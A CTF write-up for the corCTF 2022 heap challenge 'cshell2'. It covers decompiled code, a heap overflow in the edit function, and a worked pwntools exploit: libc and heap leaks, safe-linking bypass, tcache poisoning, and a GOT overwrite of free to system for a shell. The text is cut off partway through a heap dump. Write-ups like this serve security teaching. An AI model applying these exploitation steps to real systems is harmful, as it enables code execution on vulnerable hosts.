title = "[corCTF 2022 - pwn] cshell2 | repr"
description = "Introductioncshell2 is a heap challenge I did during the corCTF 2022 event. It was pretty classic so I will not describe a lot.If you begin with heap challenges, I advice you to read previous heap wri"
full_description = '''[corCTF 2022 - pwn] cshell2 2022-08-07 pwn 2.7k words 2022corCTFctfheapnasmpwn Introductioncshell2 is a heap challenge I did during the corCTF 2022 event. It was pretty classic so I will not describe a lot.If you begin with heap challenges, I advice you to read previous heap writeup. TL; DR Fill tcache. Heap overflow in edit on the bio field which allows to leak the address of the unsortedbin. Leak heap and defeat safe-linking to get an arbitrary write through tcache poisoning. Hiijack GOT entry of free to system. Call free("/bin/sh"). PROFIT Reverse EngineeringLet’s take a look at the provided binary and libc: 12345678910111213141516171819$ ./libc.so.6 GNU C Library (GNU libc) development release version 2.36.9000.Copyright (C) 2022 Free Software Foundation, Inc.This is free software; see the source for copying conditions.There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR APARTICULAR PURPOSE.Compiled by GNU CC version 12.1.0.libc ABIs: UNIQUE IFUNC ABSOLUTEMinimum supported kernel: 3.2.0For bug reporting instructions, please see:<https://www.gnu.org/software/libc/bugs.html>.$ checksec --file cshell2[*] '/home/nasm/Documents/pwn/corCTF/cshell2/cshell2' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3fb000) RUNPATH: b'.' A very recent libc plus a non PIE-based binary without FULL RELRO. Thus we could think to some GOT hiijacking stuff directly on the binary. Let’s take a look at the add function: 1234567891011121314151617181920212223242526272829303132333435unsigned __int64 add(){ int idx_1; // ebx unsigned __int8 idx; // [rsp+Fh] [rbp-21h] BYREF size_t size; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-18h] v4 = __readfsqword(0x28u); puts("Enter index: "); __isoc99_scanf("%hhu", &idx); puts("Enter size (1032 minimum): "); __isoc99_scanf("%lu", &size); if ( idx > 0xEu || size <= 0x407 || size_array[2 * idx] ) { puts("Error with either index or size..."); } else { idx_1 = idx; chunk_array[2 * idx_1] = (chunk_t *)malloc(size); size_array[2 * idx] = size; puts("Successfuly added!"); puts("Input firstname: "); read(0, chunk_array[2 * idx], 8uLL); puts("Input middlename: "); read(0, chunk_array[2 * idx]->midName, 8uLL); puts("Input lastname: "); read(0, chunk_array[2 * idx]->lastName, 8uLL); puts("Input age: "); __isoc99_scanf("%lu", &chunk_array[2 * idx]->age); puts("Input bio: "); read(0, chunk_array[2 * idx]->bio, 0x100uLL); } return v4 - __readfsqword(0x28u);} It creates a chunk by asking several fields but nothing actually interesting there. Let’s take a look at the show function: 1234567891011121314151617181920unsigned __int64 show(){ unsigned __int8 v1; // [rsp+7h] [rbp-9h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts("Enter index: "); __isoc99_scanf("%hhu", &v1); if ( v1 <= 0xEu && size_array[2 * v1] ) printf( "Name\n last: %s first: %s middle: %s age: %d\nbio: %s", chunk_array[2 * v1]->lastName, chunk_array[2 * v1]->firstName, chunk_array[2 * v1]->midName, chunk_array[2 * v1]->age, chunk_array[2 * v1]->bio); else puts("Invalid index"); return v2 - __readfsqword(0x28u);} It prints a chunk only if it’s allocated (size entry initialized in the size array) and if the index is right.Then the delete function: 1234567891011121314151617181920unsigned __int64 delete(){ unsigned __int8 v1; // [rsp+7h] [rbp-9h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf("Enter index: "); __isoc99_scanf("%hhu", &v1); if ( v1 <= 0xEu && size_array[2 * v1] ) { free(chunk_array[2 * v1]); size_array[2 * v1] = 0LL; puts("Successfully Deleted!"); } else { puts("Either index error or trying to delete something you shouldn't be..."); } return v2 - __readfsqword(0x28u);} Quite common delete handler, it prevents double free.The vulnerability is in the edit function: 123456789101112131415161718192021222324unsigned __int64 edit(){ unsigned __int8 idx; // [rsp+7h] [rbp-9h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf("Enter index: "); __isoc99_scanf("%hhu", &idx); if ( idx <= 0xEu && size_array[2 * idx] ) { puts("Input firstname: "); read(0, chunk_array[2 * idx], 8uLL); puts("Input middlename: "); read(0, chunk_array[2 * idx]->midName, 8uLL); puts("Input lastname: "); read(0, chunk_array[2 * idx]->lastName, 8uLL); puts("Input age: "); __isoc99_scanf("%lu", &chunk_array[2 * idx]->age); printf("Input bio: (max %d)\n", size_array[2 * idx] - 32LL); read(0, chunk_array[2 * idx]->bio, size_array[2 * idx] - 32LL); puts("Successfully edit'd!"); } return v2 - __readfsqword(0x28u);} It reads size_array[2 * idx] - 32LL bytes into a 0x100-sized buffer which leads to a heap overflow. ExploitationThere is no actual issue, we can allocate whatever chunk bigger than 0x407, the only fancy thing we have to do would be to defeat safe-linking to get an arbitrary write with a tcache poisoning attack on the 0x410 tcache bin. Here is the attack I led against the challenge but that’s not the most optimized. The plan is to: Allocate two 0x408-sized chunks : pivot and victim, in order to easily get later libc leak. Allocate 9 more chunks and then fill the 0x410 tcachebin with them (with only 7 of them). Delete victim and overflow pivot up to the next free pointer of victim to get a libc leak. Allocate a 0x408-sized chunk to get the 8-th chunk (within chunk_array) which is on the top of the bin. Leak the heap same way as for libc, but we have to defeat safe-linking. Delete the 9-th chunk to put it in the tcachebin at the first position. Then we can simply edit chunk 8 and overflow over chunk 9 to poison its next fp to hiijack it toward the GOT entry of free. Pop chunk 9 from the freelist and then request another the target memory area : the GOT entry of free. Write system into the GOT entry of free. Free whatever chunk for which //bin/sh is written at the right begin. PROFIT. To understand the attack process I’ll show the heap state at certain part of the attack. Libc / heap leakFirst we have to fill the tcache. We allocate a chunk right after chunk0 we do not put into the tcache to be able to put it in the unsortedbin to make appear unsortedbin’s address: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687add(0, 1032, b"//bin/sh\x00", b"", b"", 1337, b"") # pivotadd(1, 1032, b"", b"", b"", 1337, b"") # victimfor i in range(2, 7+2 + 2): add(i, 1032, b"", b"", b"", 1337, b"")for i in range(2, 7+2): delete(i)delete(1)edit(0, b"", b"", b"", 1337, b"Y"*(1032 - 64 + 7))show(0)io.recvuntil(b"Y"*(1032 - 64 + 7) + b"\n")libc.address = pwn.u64(io.recvuntil(b"1 Add\n")[:-6].ljust(8, b"\x00")) - 0x1c7cc0pwn.log.info(f"libc: {hex(libc.address)}")# Heap state:"""0x1de1290 0x0000000000000000 0x0000000000000411 ................ [chunk0]0x1de12a0 0x68732f6e69622f0a 0x0000000000000a0a ./bin/sh........0x1de12b0 0x000000000000000a 0x0000000000000539 ........9.......0x1de12c0 0x0000000000000000 0x0000000000000000 ................0x1de12d0 0x0000000000000000 0x0000000000000000 ................0x1de12e0 0x5959595959595959 0x5959595959595959 YYYYYYYYYYYYYYYY0x1de12f0 0x5959595959595959 0x5959595959595959 YYYYYYYYYYYYYYYY0x1de1300 0x5959595959595959 0x5959595959595959 YYYYYYYYYYYYYYYY0x1de1310 0x5959595959595959 0x5959595959595959 YYYYYYYYYYYYYYYY0x1de1320 0x5959595959595959 0x5959595959595959 YYYYYYYYYYYYYYYY0x1de1330 0x5959595959595959 0x5959595959595959 YYYYYYYYYYYYYYYY0x1de1340 0x5959595959595959 0x5959595959595959 YYYYYYYYYYYYYYYY0x1de1350 0x5959595959595959 0x5959595959595959 YYYYYYYYYYYYYYYY0x1de1360 0x5959595959595959 0x5959595959595959 YYYYYYYYYYYYYYYY0x1de1370 0x5959595959595959 0x5959595959595959 YYYYYYYYYYYYYYYY0x1de1380 0x5959595959595959 0x5959595959595959 YYYYYYYYYYYYYYYY0x1de1390 0x5959595959595959 0x5959595959595959 YYYYYYYYYYYYYYYY0x1de13a0 0x5959595959595959 0x5959595959595959 YYYYYYYYYYYYYYYY0